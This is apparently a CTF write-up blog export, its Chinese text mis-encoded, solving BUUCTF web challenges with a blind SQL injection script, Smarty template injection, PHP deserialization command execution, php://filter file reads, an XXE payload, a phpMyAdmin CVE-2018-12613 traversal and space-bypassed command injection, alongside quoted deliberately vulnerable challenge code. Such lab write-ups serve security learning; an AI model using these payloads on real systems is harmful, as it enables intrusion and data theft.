<h2 id="CISCN2019-ååŒ—èµ›åŒº-Day2-Web1-Hack-World"><a href="#CISCN2019-ååŒ—èµ›åŒº-Day2-Web1-Hack-World" class="headerlink" title="[CISCN2019 ååŒ—èµ›åŒº Day2 Web1]Hack World"></a>[CISCN2019 ååŒ—èµ›åŒº Day2 Web1]Hack World</h2><p>All You Want Is In Table â€˜flagâ€™ and the column is â€˜flagâ€™</p>
<p>Now, just give the id of passage</p>
<p>è¿™é“é¢˜å¯¹çˆ†ç ´æœ‰é™åˆ¶</p>
<p>é‡‡ç”¨å»¶æ—¶çˆ†ç ´ï¼Œbpå»¶æ—¶fuzzä¸€ä¸‹</p>
<p>æ ¹æ®æç¤ºå¯ä»¥çŸ¥é“flag</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#whited by zhou</span><br><span class="line">import requests</span><br><span class="line">import time</span><br><span class="line">url = &quot;http://80d573a7-5e74-4238-b99e-da083c3a0314.node4.buuoj.cn:81/index.php&quot;</span><br><span class="line">result = &quot;&quot;</span><br><span class="line">i = 0</span><br><span class="line">while True:</span><br><span class="line">    head = 32</span><br><span class="line">    tail = 127</span><br><span class="line">    i = i + 1</span><br><span class="line">    while head&lt;tail:</span><br><span class="line">        mid = (head + tail) // 2</span><br><span class="line">        payload = f&quot;if(ascii(substr((select(flag)from(flag)),&#123;i&#125;,1))&gt;&#123;mid&#125;,1,2)&quot;</span><br><span class="line">        data = &#123;</span><br><span class="line">            &quot;id&quot;: payload,</span><br><span class="line">        &#125;</span><br><span class="line">        r = requests.post(url, data)</span><br><span class="line">        time.sleep(0.1)</span><br><span class="line">        if &quot;Hello&quot; in r.text:</span><br><span class="line">            head = mid + 1</span><br><span class="line">        else:</span><br><span class="line">            tail = mid</span><br><span class="line">    result += chr(head)</span><br><span class="line">    if &#x27;&#125;&#x27; in result:</span><br><span class="line">      break</span><br><span class="line">    print(result)</span><br></pre></td></tr></table></figure>

<p>xx9nGK&amp;2t</p>
]]></content>
      <categories>
        <category>buu</category>
      </categories>
      <tags>
        <tag>buu</tag>
      </tags>
  </entry>
  <entry>
    <title>buu2</title>
    <url>/2023/05/13/buu%E5%90%88%E9%9B%86-buu2/</url>
    <content><![CDATA[<p>buuç¬¬äºŒé¡µ</p>
 <span id="more"></span>

<h2 id="ç½‘é¼æ¯-2018-Fakebook"><a href="#ç½‘é¼æ¯-2018-Fakebook" class="headerlink" title="[ç½‘é¼æ¯ 2018]Fakebook"></a>[ç½‘é¼æ¯ 2018]Fakebook</h2><p>è®¿é—®robots.txt</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">class UserInfo</span><br><span class="line">&#123;</span><br><span class="line">    public $name = &quot;&quot;;</span><br><span class="line">    public $age = 0;</span><br><span class="line">    public $blog = &quot;&quot;;</span><br><span class="line"></span><br><span class="line">    public function __construct($name, $age, $blog)</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;name = $name;</span><br><span class="line">        $this-&gt;age = (int)$age;</span><br><span class="line">        $this-&gt;blog = $blog;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function get($url)</span><br><span class="line">    &#123;</span><br><span class="line">        $ch = curl_init();</span><br><span class="line"></span><br><span class="line">        curl_setopt($ch, CURLOPT_URL, $url);</span><br><span class="line">        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);</span><br><span class="line">        $output = curl_exec($ch);</span><br><span class="line">        $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);</span><br><span class="line">        if($httpCode == 404) &#123;</span><br><span class="line">            return 404;</span><br><span class="line">        &#125;</span><br><span class="line">        curl_close($ch);</span><br><span class="line"></span><br><span class="line">        return $output;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function getBlogContents ()</span><br><span class="line">    &#123;</span><br><span class="line">        return $this-&gt;get($this-&gt;blog);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function isValidBlog ()</span><br><span class="line">    &#123;</span><br><span class="line">        $blog = $this-&gt;blog;</span><br><span class="line">        return preg_match(&quot;/^(((http(s?))\:\/\/)?)([0-9a-zA-Z\-]+\.)+[a-zA-Z]&#123;2,6&#125;(\:[0-9]+)?(\/\S*)?$/i&quot;, $blog);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h2 id="BJDCTF2020-The-mystery-of-ip"><a href="#BJDCTF2020-The-mystery-of-ip" class="headerlink" title="[BJDCTF2020]The mystery of ip"></a>[BJDCTF2020]The mystery of ip</h2><p>Smartyæ˜¯ä¸€ä¸ªPHPçš„æ¨¡æ¿å¼•æ“</p>
<p>[(9æ¡æ¶ˆæ¯) <a href="https://blog.csdn.net/weixin_53150482/article/details/125750136">BJDCTF2020]The mystery of ip_2013040742 è´¾æ—å½¬çš„åšå®¢-CSDNåšå®¢</a></p>
<p>smart æ¨¡æ¿æ³¨å…¥</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;if phpinfo()&#125;&#123;/if&#125;</span><br><span class="line">&#123;if readfile(â€˜æ–‡ä»¶è·¯åŠ²â€™)&#125;&#123;/if&#125;</span><br><span class="line">&#123;if show_source(â€˜æ–‡ä»¶è·¯å¾„â€™)&#125;&#123;/if&#125;</span><br><span class="line">&#123;if passthru(â€˜æ“ä½œå‘½ä»¤â€™)&#125;&#123;/if&#125;</span><br><span class="line">&#123;if system(â€˜æ“ä½œå‘½ä»¤â€™)&#125;&#123;/if&#125;</span><br></pre></td></tr></table></figure>

<p>å°†XFFæ”¹ä¸º<code>&#123;system(&#39;cat /flag&#39;)&#125;</code>å³å¯å¾—åˆ°flag</p>
<h2 id="ç½‘é¼æ¯-2020-æœ±é›€ç»„-phpweb"><a href="#ç½‘é¼æ¯-2020-æœ±é›€ç»„-phpweb" class="headerlink" title="[ç½‘é¼æ¯ 2020 æœ±é›€ç»„]phpweb"></a>[ç½‘é¼æ¯ 2020 æœ±é›€ç»„]phpweb</h2><p>æŠ“åŒ…çœ‹ä¸€çœ¼</p>
<p><img src="/2023/05/13/buu%E5%90%88%E9%9B%86-buu2/QQ%E6%88%AA%E5%9B%BE20230515125322.png"></p>
<p>PHP date() å‡½æ•°å¯æŠŠæ—¶é—´æˆ³æ ¼å¼åŒ–ä¸ºå¯è¯»æ€§æ›´å¥½çš„æ—¥æœŸå’Œæ—¶é—´ã€‚</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">echo date(&quot;Y/m/d&quot;)ï¼›</span><br><span class="line">2016/10/21</span><br></pre></td></tr></table></figure>

<p>æ¢ç”¨ä¸€ä¸‹å‡½æ•°</p>
<p>func&#x3D;file_get_contents&amp;p&#x3D;index.php</p>
<p>çœ‹åˆ°æºç </p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$disable_fun = array(&quot;exec&quot;,&quot;shell_exec&quot;,&quot;system&quot;,&quot;passthru&quot;,&quot;proc_open&quot;,&quot;show_source&quot;,&quot;phpinfo&quot;,&quot;popen&quot;,&quot;dl&quot;,&quot;eval&quot;,&quot;proc_terminate&quot;,&quot;touch&quot;,&quot;escapeshellcmd&quot;,&quot;escapeshellarg&quot;,&quot;assert&quot;,&quot;substr_replace&quot;,&quot;call_user_func_array&quot;,&quot;call_user_func&quot;,&quot;array_filter&quot;, &quot;array_walk&quot;,  &quot;array_map&quot;,&quot;registregister_shutdown_function&quot;,&quot;register_tick_function&quot;,&quot;filter_var&quot;, &quot;filter_var_array&quot;, &quot;uasort&quot;, &quot;uksort&quot;, &quot;array_reduce&quot;,&quot;array_walk&quot;, &quot;array_walk_recursive&quot;,&quot;pcntl_exec&quot;,&quot;fopen&quot;,&quot;fwrite&quot;,&quot;file_put_contents&quot;);</span><br><span class="line"> function gettime($func, $p) &#123;</span><br><span class="line">     $result = call_user_func($func, $p);</span><br><span class="line">     $a= gettype($result);</span><br><span class="line">     if ($a == &quot;string&quot;) &#123;</span><br><span class="line">         return $result;</span><br><span class="line">     &#125; else &#123;return &quot;&quot;;&#125;</span><br><span class="line"> &#125;</span><br><span class="line"> class Test &#123;</span><br><span class="line">     var $p = &quot;Y-m-d h:i:s a&quot;;</span><br><span class="line">     var $func = &quot;date&quot;;</span><br><span class="line">     function __destruct() &#123;</span><br><span class="line">         if ($this-&gt;func != &quot;&quot;) &#123;</span><br><span class="line">             echo gettime($this-&gt;func, $this-&gt;p);</span><br><span class="line">         &#125;</span><br><span class="line">     &#125;</span><br><span class="line"> &#125;</span><br><span class="line"> $func = $_REQUEST[&quot;func&quot;];</span><br><span class="line"> $p = $_REQUEST[&quot;p&quot;];</span><br><span class="line"></span><br><span class="line"> if ($func != null) &#123;</span><br><span class="line">     $func = strtolower($func);</span><br><span class="line">     if (!in_array($func,$disable_fun)) &#123;</span><br><span class="line">         echo gettime($func, $p);</span><br><span class="line">     &#125;else &#123;</span><br><span class="line">         die(&quot;Hacker...&quot;);</span><br><span class="line">     &#125;</span><br><span class="line"> &#125;</span><br><span class="line"> ?&gt;</span><br></pre></td></tr></table></figure>

<p>call_user_funcå‡½æ•°ç±»ä¼¼äºä¸€ç§ç‰¹åˆ«çš„è°ƒç”¨å‡½æ•°çš„æ–¹æ³•ï¼Œä½¿ç”¨æ–¹æ³•å¦‚ä¸‹ï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">function nowamagic($a,$b)   </span><br><span class="line">&#123;   </span><br><span class="line">    echo $a;   </span><br><span class="line">    echo $b;   </span><br><span class="line">&#125;   </span><br><span class="line">call_user_func(&#x27;nowamagic&#x27;, &quot;111&quot;,&quot;222&quot;);   </span><br><span class="line">call_user_func(&#x27;nowamagic&#x27;, &quot;333&quot;,&quot;444&quot;);   </span><br><span class="line">//æ˜¾ç¤º 111 222 333 444   </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>ååºåˆ—åŒ–ç»•è¿‡ï¼›</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class Test &#123;</span><br><span class="line">    var $p = &quot;ls&quot;;</span><br><span class="line">    var $func = &quot;system&quot;;</span><br><span class="line">    function __destruct() &#123;</span><br><span class="line">        if ($this-&gt;func != &quot;&quot;) &#123;</span><br><span class="line">            echo gettime($this-&gt;func, $this-&gt;p);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$a=new Test();</span><br><span class="line">echo serialize($a);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>



<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">func=unserialize&amp;p=O:4:&quot;Test&quot;:2:&#123;s:1:&quot;p&quot;;s:10:&quot;cd /tmp;ls&quot;;s:4:&quot;func&quot;;s:6:&quot;system&quot;;&#125;</span><br></pre></td></tr></table></figure>



<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">func=unserialize&amp;p=O:4:&quot;Test&quot;:2:&#123;s:1:&quot;p&quot;;s:14:&quot;cd /tmp;cat f*&quot;;s:4:&quot;func&quot;;s:6:&quot;system&quot;;&#125;</span><br></pre></td></tr></table></figure>

<h2 id="BUUCTF-2018-Online-Tool"><a href="#BUUCTF-2018-Online-Tool" class="headerlink" title="[BUUCTF 2018]Online Tool"></a>[BUUCTF 2018]Online Tool</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">if (isset($_SERVER[&#x27;HTTP_X_FORWARDED_FOR&#x27;])) &#123;</span><br><span class="line">    $_SERVER[&#x27;REMOTE_ADDR&#x27;] = $_SERVER[&#x27;HTTP_X_FORWARDED_FOR&#x27;];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if(!isset($_GET[&#x27;host&#x27;])) &#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125; else &#123;</span><br><span class="line">    $host = $_GET[&#x27;host&#x27;];</span><br><span class="line">    $host = escapeshellarg($host);</span><br><span class="line">    $host = escapeshellcmd($host);</span><br><span class="line">    $sandbox = md5(&quot;glzjin&quot;. $_SERVER[&#x27;REMOTE_ADDR&#x27;]);</span><br><span class="line">    echo &#x27;you are in sandbox &#x27;.$sandbox;</span><br><span class="line">    @mkdir($sandbox);</span><br><span class="line">    chdir($sandbox);</span><br><span class="line">    echo system(&quot;nmap -T5 -sT -Pn --host-timeout 2 -F &quot;.$host);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="BSidesCF-2020-Had-a-bad-day"><a href="#BSidesCF-2020-Had-a-bad-day" class="headerlink" title="[BSidesCF 2020]Had a bad day"></a>[BSidesCF 2020]Had a bad day</h2><p>ä¼ªåè®®è¯»æºç </p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">php://filter/convert.base64-encode/resource=index</span><br></pre></td></tr></table></figure>



<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$file = $_GET[&#x27;category&#x27;];</span><br><span class="line"></span><br><span class="line">if(isset($file))</span><br><span class="line">&#123;</span><br><span class="line">    if( strpos( $file, &quot;woofers&quot; ) !==  false || strpos( $file, &quot;meowers&quot; ) !==  false || strpos( $file, &quot;index&quot;))&#123;</span><br><span class="line">        include ($file . &#x27;.php&#x27;);</span><br><span class="line">    &#125;</span><br><span class="line">    else&#123;</span><br><span class="line">        echo &quot;Sorry, we currently only support woofers and meowers.&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>strpos() få‡½æ•°æŸ¥æ‰¾å­—ç¬¦ä¸²åœ¨å¦ä¸€å­—ç¬¦ä¸²ä¸­ç¬¬ä¸€æ¬¡å‡ºç°çš„ä½ç½®ï¼ˆåŒºåˆ†å¤§å°å†™ï¼‰ã€‚</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?category=php://filter/convert.base64-encode/index/resource=flag</span><br></pre></td></tr></table></figure>

<h2 id="GXYCTF2019-ç¦æ­¢å¥—å¨ƒ"><a href="#GXYCTF2019-ç¦æ­¢å¥—å¨ƒ" class="headerlink" title="[GXYCTF2019]ç¦æ­¢å¥—å¨ƒ"></a>[GXYCTF2019]ç¦æ­¢å¥—å¨ƒ</h2><p>.git æ³„éœ²</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python GitHack.py http://760b4096-abac-4599-8173-10f22bf14fb6.node4.buuoj.cn/.git/</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">include &quot;flag.php&quot;;</span><br><span class="line">echo &quot;flagåœ¨å“ªé‡Œå‘¢ï¼Ÿ&lt;br&gt;&quot;;</span><br><span class="line">if(isset($_GET[&#x27;exp&#x27;]))&#123;</span><br><span class="line">    if (!preg_match(&#x27;/data:\/\/|filter:\/\/|php:\/\/|phar:\/\//i&#x27;, $_GET[&#x27;exp&#x27;])) &#123;</span><br><span class="line">        if(&#x27;;&#x27; === preg_replace(&#x27;/[a-z,_]+\((?R)?\)/&#x27;, NULL, $_GET[&#x27;exp&#x27;])) &#123;</span><br><span class="line">            if (!preg_match(&#x27;/et|na|info|dec|bin|hex|oct|pi|log/i&#x27;, $_GET[&#x27;exp&#x27;])) &#123;</span><br><span class="line">                // echo $_GET[&#x27;exp&#x27;];</span><br><span class="line">                @eval($_GET[&#x27;exp&#x27;]);</span><br><span class="line">            &#125;</span><br><span class="line">            else&#123;</span><br><span class="line">                die(&quot;è¿˜å·®ä¸€ç‚¹å“¦ï¼&quot;);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        else&#123;</span><br><span class="line">            die(&quot;å†å¥½å¥½æƒ³æƒ³ï¼&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    else&#123;</span><br><span class="line">        die(&quot;è¿˜æƒ³è¯»flagï¼Œè‡­å¼Ÿå¼Ÿï¼&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">// highlight_file(__FILE__);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>payloadï¼›æ— å‚æ•°RCE</p>
<p><a href="https://blog.csdn.net/Manuffer/article/details/120738755">(11æ¡æ¶ˆæ¯) æ— å‚æ•°RCEæ€»ç»“_L1am0urçš„åšå®¢-CSDNåšå®¢</a></p>
<p>è¯»å–flagçš„ä½ç½®</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?exp=print_r(scandir(current(localeconv())));</span><br></pre></td></tr></table></figure>

<p>Array ( [0] &#x3D;&gt; . [1] &#x3D;&gt; .. [2] &#x3D;&gt; .git [3] &#x3D;&gt; flag.php [4] &#x3D;&gt; index.php )</p>
<p>è¯»å–flag</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">exp=highlight_file(next(array_reverse(scandir(pos(localeconv())))));</span><br></pre></td></tr></table></figure>

<p>æ–¹æ³•äºŒï¼š</p>
<p>payload:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">exp=show_source(session_id(session_start()));ï¼Œåˆ«å¿˜äº†ä¿®æ”¹Cookie: PHPSESSID=flag.php</span><br></pre></td></tr></table></figure>

<h2 id="BJDCTF2020-ZJCTFï¼Œä¸è¿‡å¦‚æ­¤"><a href="#BJDCTF2020-ZJCTFï¼Œä¸è¿‡å¦‚æ­¤" class="headerlink" title="[BJDCTF2020]ZJCTFï¼Œä¸è¿‡å¦‚æ­¤"></a>[BJDCTF2020]ZJCTFï¼Œä¸è¿‡å¦‚æ­¤</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">error_reporting(0);</span><br><span class="line">$text = $_GET[&quot;text&quot;];</span><br><span class="line">$file = $_GET[&quot;file&quot;];</span><br><span class="line">if(isset($text)&amp;&amp;(file_get_contents($text,&#x27;r&#x27;)===&quot;I have a dream&quot;))&#123;</span><br><span class="line">    echo &quot;&lt;br&gt;&lt;h1&gt;&quot;.file_get_contents($text,&#x27;r&#x27;).&quot;&lt;/h1&gt;&lt;/br&gt;&quot;;</span><br><span class="line">    if(preg_match(&quot;/flag/&quot;,$file))&#123;</span><br><span class="line">        die(&quot;Not now!&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    include($file);  //next.php</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>è¯»å–ä¸€ä¸‹next.php</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">text=data:text/plain,I%20have%20a%20dream&amp;file=php://filter/read=convert.base64-encode/resource=next.php</span><br></pre></td></tr></table></figure>



<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$id = $_GET[&#x27;id&#x27;];</span><br><span class="line">$_SESSION[&#x27;id&#x27;] = $id;</span><br><span class="line">function complex($re, $str) &#123;</span><br><span class="line">    return preg_replace(&#x27;/(&#x27;.$re.&#x27;)/ei&#x27;,&#x27;strtolower(&quot;\\1&quot;)&#x27;,       $str);</span><br><span class="line">&#125;foreach($_GET as $re =&gt; $str) &#123;</span><br><span class="line">    echo complex($re, $str). &quot;\n&quot;;</span><br><span class="line">&#125;function getFlag()&#123;</span><br><span class="line">    @eval($_GET[&#x27;cmd&#x27;]);&#125;</span><br></pre></td></tr></table></figure>

<p><strong>preg_replace</strong> å‡½æ•°åœ¨åŒ¹é…åˆ°ç¬¦å·æ­£åˆ™çš„å­—ç¬¦ä¸²æ—¶ï¼Œä¼šå°†æ›¿æ¢å­—ç¬¦ä¸²ï¼ˆä¹Ÿå°±æ˜¯ä¸Šå›¾ <strong>preg_replace</strong> å‡½æ•°çš„ç¬¬äºŒä¸ªå‚æ•°ï¼‰å½“åšä»£ç æ¥æ‰§è¡Œï¼Œç„¶è€Œè¿™é‡Œçš„ç¬¬äºŒä¸ªå‚æ•°å´å›ºå®šä¸º <strong>â€˜strtolower(â€œ\1â€)â€™</strong> å­—ç¬¦ä¸²</p>
<p><a href="https://xz.aliyun.com/t/2557">æ·±å…¥ç ”ç©¶preg_replaceä¸ä»£ç æ‰§è¡Œ - å…ˆçŸ¥ç¤¾åŒº (aliyun.com)</a></p>
<p>è§£æ³•ä¸€payload:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/next.php?\S*=$&#123;system(chr(99).chr(97).chr(116).chr(32).chr(47).chr(102).chr(108).chr(97).chr(103))&#125;</span><br></pre></td></tr></table></figure>

<p>è§£æ³•äºŒpayload:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?\S*=$&#123;getFlag()&#125;&amp;cmd=system(&#x27;cat /flag&#x27;);</span><br></pre></td></tr></table></figure>



<h2 id="GWCTF-2019-æˆ‘æœ‰ä¸€ä¸ªæ•°æ®åº“"><a href="#GWCTF-2019-æˆ‘æœ‰ä¸€ä¸ªæ•°æ®åº“" class="headerlink" title="[GWCTF 2019]æˆ‘æœ‰ä¸€ä¸ªæ•°æ®åº“"></a>[GWCTF 2019]æˆ‘æœ‰ä¸€ä¸ªæ•°æ®åº“</h2><p><strong>phpMyAdmin 4.8.1 è¿œç¨‹æ–‡ä»¶åŒ…å«</strong></p>
<p><a href="https://blog.csdn.net/weixin_44037296/article/details/111039461">phpMyAdmin 4.8.1 è¿œç¨‹æ–‡ä»¶åŒ…å« CVE-2018-12613</a></p>
<p>payload</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/phpmyadmin/index.php?target=db_sql.php%253f/../../../../../../../../flag</span><br></pre></td></tr></table></figure>

<h2 id="NCTF2019-Fake-XML-cookbook"><a href="#NCTF2019-Fake-XML-cookbook" class="headerlink" title="[NCTF2019]Fake XML cookbook"></a>[NCTF2019]Fake XML cookbook</h2><p> é¢˜ç›®æ—¢ç„¶å·²ç»æç¤ºxmLéšä¾¿è¾“å…¥123ï¼Œ123ï¼ŒæŠ“åŒ…çœ‹çœ‹</p>
<p><img src="/2023/05/13/buu%E5%90%88%E9%9B%86-buu2/QQ%E6%88%AA%E5%9B%BE20230516121956.png"></p>
<p><a href="https://www.freebuf.com/vuls/175451.html">æµ…è°ˆXMLå®ä½“æ³¨å…¥æ¼æ´ - FreeBufç½‘ç»œå®‰å…¨è¡Œä¸šé—¨æˆ·</a></p>
<p><img src="/2023/05/13/buu%E5%90%88%E9%9B%86-buu2/QQ%E6%88%AA%E5%9B%BE20230516122544.png"></p>
<p>payload:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE note [</span><br><span class="line">  &lt;!ENTITY admin SYSTEM &quot;file:///flag&quot;&gt;</span><br><span class="line">  ]&gt;</span><br><span class="line">&lt;user&gt;&lt;username&gt;&amp;admin;&lt;/username&gt;&lt;password&gt;123456&lt;/password&gt;&lt;/user</span><br></pre></td></tr></table></figure>

<h2 id="WUSTCTF2020-æœ´å®æ— å"><a href="#WUSTCTF2020-æœ´å®æ— å" class="headerlink" title="[WUSTCTF2020]æœ´å®æ— å"></a>[WUSTCTF2020]æœ´å®æ— å</h2><p>æŠ“åŒ…åçœ‹åˆ°fl4g.php</p>
<p>è®¿é—®ä¸€ä¸‹</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">header(&#x27;Content-type:text/html;charset=utf-8&#x27;);</span><br><span class="line">error_reporting(0);</span><br><span class="line">highlight_file(__file__);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">//level 1</span><br><span class="line">if (isset($_GET[&#x27;num&#x27;]))&#123;</span><br><span class="line">    $num = $_GET[&#x27;num&#x27;];</span><br><span class="line">    if(intval($num) &lt; 2020 &amp;&amp; intval($num + 1) &gt; 2021)&#123;</span><br><span class="line">        echo &quot;æˆ‘ä¸ç»æ„é—´çœ‹äº†çœ‹æˆ‘çš„åŠ³åŠ›å£«, ä¸æ˜¯æƒ³çœ‹æ—¶é—´, åªæ˜¯æƒ³ä¸ç»æ„é—´, è®©ä½ çŸ¥é“æˆ‘è¿‡å¾—æ¯”ä½ å¥½.&lt;/br&gt;&quot;;</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        die(&quot;é‡‘é’±è§£å†³ä¸äº†ç©·äººçš„æœ¬è´¨é—®é¢˜&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    die(&quot;å»éæ´²å§&quot;);</span><br><span class="line">&#125;</span><br><span class="line">//level 2</span><br><span class="line">if (isset($_GET[&#x27;md5&#x27;]))&#123;</span><br><span class="line">   $md5=$_GET[&#x27;md5&#x27;];</span><br><span class="line">   if ($md5==md5($md5))</span><br><span class="line">       echo &quot;æƒ³åˆ°è¿™ä¸ªCTFeræ‹¿åˆ°flagå, æ„Ÿæ¿€æ¶•é›¶, è·‘å»ä¸œæ¾œå²¸, æ‰¾ä¸€å®¶é¤å…, æŠŠå¨å¸ˆè½°å‡ºå», è‡ªå·±ç‚’ä¸¤ä¸ªæ‹¿æ‰‹å°èœ, å€’ä¸€æ¯æ•£è£…ç™½é…’, è‡´å¯Œæœ‰é“, åˆ«å­¦å°æš´.&lt;/br&gt;&quot;;</span><br><span class="line">   else</span><br><span class="line">       die(&quot;æˆ‘èµ¶ç´§å–Šæ¥æˆ‘çš„é…’è‚‰æœ‹å‹, ä»–æ‰“äº†ä¸ªç”µè¯, æŠŠä»–ä¸€å®¶å®‰æ’åˆ°äº†éæ´²&quot;);</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    die(&quot;å»éæ´²å§&quot;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">//get flag</span><br><span class="line">if (isset($_GET[&#x27;get_flag&#x27;]))&#123;</span><br><span class="line">    $get_flag = $_GET[&#x27;get_flag&#x27;];</span><br><span class="line">    if(!strstr($get_flag,&quot; &quot;))&#123;</span><br><span class="line">        $get_flag = str_ireplace(&quot;cat&quot;, &quot;wctf2020&quot;, $get_flag);</span><br><span class="line">        echo &quot;æƒ³åˆ°è¿™é‡Œ, æˆ‘å……å®è€Œæ¬£æ…°, æœ‰é’±äººçš„å¿«ä¹å¾€å¾€å°±æ˜¯è¿™ä¹ˆçš„æœ´å®æ— å, ä¸”æ¯ç‡¥.&lt;/br&gt;&quot;;</span><br><span class="line">        system($get_flag);</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        die(&quot;å¿«åˆ°éæ´²äº†&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    die(&quot;å»éæ´²å§&quot;);</span><br><span class="line">&#125;</span><br><span class="line">?&gt; </span><br></pre></td></tr></table></figure>

<p>ç¬¬ä¸€ä¸ªç»•è¿‡</p>
<p>PHP str_ireplace() å‡½æ•°</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if(intval($num) &lt; 2020 &amp;&amp; intval($num + 1) &gt; 2021)</span><br></pre></td></tr></table></figure>

<p>16è¿›åˆ¶ç§‘å­¦è®¡æ•°æ³•ï¼Œè¿˜æœ‰å¾ˆå¤šæ–¹æ³•ï¼Œ</p>
<p>num&#x3D;0x9e9</p>
<p>ç¬¬äºŒå±‚åŠ å¯†åç›¸ç­‰</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0e215962017</span><br></pre></td></tr></table></figure>

<p>æŠŠå­—ç¬¦ä¸² â€œHello world!â€ ä¸­çš„å­—ç¬¦ â€œWORLDâ€ï¼ˆä¸åŒºåˆ†å¤§å°å†™ï¼‰æ›¿æ¢æˆ â€œShanghaiâ€ï¼š</p>
<p>PHP strstr() å‡½æ•°</p>
<p>æŸ¥æ‰¾ â€œShanghaiâ€ åœ¨ â€œI love Shanghai!â€ ä¸­çš„ç¬¬ä¸€æ¬¡å‡ºç°ï¼Œå¹¶è¿”å›å­—ç¬¦ä¸²çš„å‰©ä½™éƒ¨åˆ†ï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">echo strstr(&quot;I love Shanghai!&quot;,&quot;Shanghai&quot;);</span><br><span class="line">ç»“æœ</span><br><span class="line">Shanghai!</span><br></pre></td></tr></table></figure>

<p>ç¬¬ä¸‰å±‚</p>
<p>if(!strstr($get_flag,â€ â€œ))&#x2F;&#x2F;æ— ç©ºæ ¼</p>
<p>${IFS} %09 ç­‰ç©ºæ ¼ç»•è¿‡å³å¯</p>
<p>è¿™é“é¢˜ä¸éš¾ï¼Œå‡ºç°åœ¨è¿™ä¸ªä½ç½®ä¸ç†è§£</p>
<p>payload:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?num=0x9e9&amp;md5=0e215962017&amp;get_flag=ls</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?num=0x9e9&amp;md5=0e215962017&amp;get_flag=tac%09flll*</span><br></pre></td></tr></table></figure>

